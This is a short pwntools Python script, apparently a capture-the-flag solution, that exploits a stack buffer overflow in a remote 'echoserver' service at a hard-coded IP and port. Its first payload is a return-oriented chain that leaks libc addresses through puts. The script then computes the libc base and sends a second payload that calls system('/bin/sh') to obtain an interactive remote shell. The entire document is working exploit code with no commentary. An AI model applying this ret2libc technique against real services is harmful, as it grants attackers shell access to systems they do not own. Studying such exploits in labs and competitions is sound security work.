from pwn import *

r = remote("125.235.240.166",20101)
# r = process("./echoserver")
# gdb.attach(r)

puts_plt = 0x401030
puts_got = 0x404018
gets_got = 0x404030
pop_rdi_ret = 0x00000000004012cb
ret = 0x0000000000401016
loop = 0x0000000000401229
main = 0x00000000004011AE
payload = "QUIT"
payload += (136 - len(payload))*"A"
payload += p64(pop_rdi_ret) + p64(puts_got)
payload += p64(puts_plt) + p64(pop_rdi_ret)
payload += p64(gets_got) + p64(puts_plt)
payload += p64(main)

r.sendline(payload)

r.recvuntil("\n")
leaka = r.recvuntil("\n")[:-1]
print(leaka,len(leaka))
leaka = u64(leaka + "\x00\x00")
print(hex(leaka))
leakb = r.recvuntil("\n")[:-1]
print(leakb)
leakb = u64(leakb + "\x00\x00")
print(hex(leakb))

puts_offset = 0x875a0
base = leaka - puts_offset
system_off = 0x55410
system = base + system_off
binsh = 0x1b75aa

payload = "QUIT"
payload += (136 - len(payload))*"A"
payload += p64(pop_rdi_ret) + p64(binsh+base)
payload += p64(system)
r.sendline(payload)
r.interactive()